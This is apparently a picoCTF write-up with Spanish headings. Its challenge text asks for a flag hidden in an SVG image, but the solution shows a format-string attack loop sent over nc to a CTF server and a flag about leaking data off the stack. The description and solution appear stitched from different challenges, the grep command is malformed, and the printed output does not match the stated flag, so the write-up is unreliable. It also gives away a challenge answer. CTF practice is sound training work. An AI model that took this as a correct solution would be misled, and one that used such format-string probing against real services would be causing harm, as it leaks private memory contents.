## Descripcipción

Download this image file and find the flag.

-   [Download image file](https://artifacts.picoctf.net/c/102/drawing.flag.svg)

## Pistas

-   (None)

## Solucion
```
┌──(kali㉿kali)-[~/Documents/binary/flack]
└─$ for i in {0..999}; do echo "%$i\$s" | nc saturn.picoctf.net 49316 |grep -Ei (pico|ctf) ;done

CTF{L34k1ng_Fl4g_0ff_St4ck_ff01c38e}
```
## Bandera
picoCTF{L34k1ng_Fl4g_0ff_St4ck_ff01c38e}